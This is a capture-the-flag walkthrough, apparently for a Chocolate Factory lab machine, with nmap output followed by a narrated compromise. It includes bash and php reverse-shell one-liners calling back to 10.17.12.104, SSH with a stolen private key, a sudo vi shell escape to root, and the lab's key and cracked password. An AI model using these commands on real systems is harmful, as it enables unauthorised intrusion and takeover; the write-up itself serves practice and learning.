+SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
+SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
+SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
+SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port103-TCP:V=7.91%I=7%D=7/3%Time=60DFFA1F%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20___
+SF:\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x20
+SF:\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x20
+SF:___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:\
+SF:\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\'
+SF:\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\n
+SF:\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x20
+SF:\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`\
+SF:r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20\
+SF:x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__________
+SF:____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20Mr
+SF:\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;\
+SF:)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Generi
+SF:cLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
+SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
+SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
+SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
+SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
+SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
+SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
+SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
+SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
+SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
+SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
+SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
+SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port104-TCP:V=7.91%I=7%D=7/3%Time=60DFFA1F%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20___
+SF:\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x20
+SF:\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x20
+SF:___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:\
+SF:\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\'
+SF:\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\n
+SF:\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x20
+SF:\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`\
+SF:r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20\
+SF:x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__________
+SF:____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20Mr
+SF:\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;\
+SF:)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Generi
+SF:cLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
+SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
+SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
+SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
+SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
+SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
+SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
+SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
+SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
+SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
+SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
+SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
+SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port105-TCP:V=7.91%I=7%D=7/3%Time=60DFFA2A%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
+SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
+SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
+SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
+SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
+SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
+SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
+SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
+SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
+SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
+SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
+SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
+SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(
+SF:HTTPOptions,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20
+SF:\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.--------------
+SF:-\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\
+SF:x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20_
+SF:_\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\
+SF:\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\__
+SF:_\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x2
+SF:0__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\
+SF:r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;--------
+SF:---------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\
+SF:\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\
+SF:|______________________;________________\|\r\n\r\nA\x20small\x20hint\x2
+SF:0from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20
+SF:here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20
+SF:");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port107-TCP:V=7.91%I=7%D=7/3%Time=60DFFA1F%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20___
+SF:\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x20
+SF:\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x20
+SF:___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:\
+SF:\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\'
+SF:\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\n
+SF:\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x20
+SF:\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`\
+SF:r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20\
+SF:x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__________
+SF:____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20Mr
+SF:\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;\
+SF:)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Generi
+SF:cLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
+SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
+SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
+SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
+SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
+SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
+SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
+SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
+SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
+SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
+SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
+SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
+SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port109-TCP:V=7.91%I=7%D=7/3%Time=60DFFA1F%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20___
+SF:\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x20
+SF:\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x20
+SF:___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:\
+SF:\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\'
+SF:\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\n
+SF:\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x20
+SF:\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`\
+SF:r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20\
+SF:x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__________
+SF:____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20Mr
+SF:\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;\
+SF:)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Generi
+SF:cLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
+SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
+SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
+SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
+SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
+SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
+SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
+SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
+SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
+SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
+SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
+SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
+SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port110-TCP:V=7.91%I=7%D=7/3%Time=60DFFA1F%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20___
+SF:\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x20
+SF:\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x20
+SF:___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:\
+SF:\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\'
+SF:\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\n
+SF:\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x20
+SF:\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`\
+SF:r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20\
+SF:x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__________
+SF:____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20Mr
+SF:\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;\
+SF:)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Generi
+SF:cLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\
+SF:x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r
+SF:\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20__
+SF:__\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
+SF:x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\
+SF:\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20
+SF:\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x
+SF:20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------------
+SF:----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x2
+SF:0\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|____
+SF:__________________;________________\|\r\n\r\nA\x20small\x20hint\x20from
+SF:\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!
+SF:\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 11:26
+Completed NSE at 11:26, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 11:26
+Completed NSE at 11:26, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 11:26
+Completed NSE at 11:26, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 493.38 seconds
+
+
+till the time nmap was running in background i decided to visit port 80 and see it landed me to a login page so i tried with default creds it didnt worked so i tired with gobuster scan 
+
+gobuster dir -u http://ip -w wordlist -t100 -x php,html,txt
+
+after this i found a file in the  main directory : home.php
+
+where i can exectute system commands so tried looking for diffent file and reading through it!
+
+i saw a file named key_rev_key
+
+from the name i though we have to do reverse enginering to see though the file but i didnt know rev eng at all so what i did was cat out the file but didnt got after that i tried strings key_rev_key
+
+and this got me the file contents and the key
+
+[]A\A]A^A_
+Enter your name: 
+laksdhfas
+ congratulations you have found the key:   
+b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+ Keep its safe
+Bad name!
+;*3$"
+GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crtstuff.c
+
+
+it was like this and i got the key!
+
+i though of cracking it and getting password or some hint to solve the machine
+but i havent got what kind of hash is this so tried to look for different kind of hashes but failed after that i though of getting a rev connection from the webserver and see through the file as the web server was not helpful in letting me see though the other directories!
+
+so i visited payload all the  things and first got a bash rev shell it didnt worked out for me after that i tried a php shell
+
+bash -i >& /dev/tcp/10.17.12.104/4242 0>&1
+
+php -r '$sock=fsockopen("10.17.12.104",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+okay so the php shell worked and i m inside the webserver now! i decided to go into the /home/charlie directory and see through it contents i saw a file teleport.pub and teleport so it was actually the id_rsa file of charlie user so i copied those files and made an ssh connection into the charlie user 
+
+now i m the user now i though of searching for suid file but didnt got anything after that i though of doing the sudo -l thing and saw that there was a vulnerability of
+
+ CVE-2019-14287 in the Unix Sudo Program
+ 
+ so it tried sudo -u#-1 vi but it didnt worked out so i visited gtfo bins and copied the sudo command for vi having
+ 
+ sudo  vi -c ':!/bin/sh' /dev/null
+ 
+ now i am the root user
+ 
+ till this time the hashcat was finished and i got the charlie's password that was : cn7824
+ 
+ went to the root folder there was a file root.py read that file and saw it was asking for a key! which we got earlier i copied the key and pasted the key! when i executed the root.py file and got the root user
+ 
+ python2 root.py
+ Enter the key : b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+ 
+ __   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                                                             
+  ___                              ___   __  
+ / _ \__      ___ __   ___ _ __   / _ \ / _| 
+| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
+| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
+ \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
+                                             
+
+  ____ _                     _       _       
+ / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
+| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
+| |___| | | | (_) | (_| (_) | | (_| | ||  __/
+ \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
+                                             
+ _____          _                    
+|  ___|_ _  ___| |_ ___  _ __ _   _  
+| |_ / _` |/ __| __/ _ \| '__| | | | 
+|  _| (_| | (__| || (_) | |  | |_| | 
+|_|  \__,_|\___|\__\___/|_|   \__, | 
+                              |___/  
+
+
+now we got it congrats! 
+ 
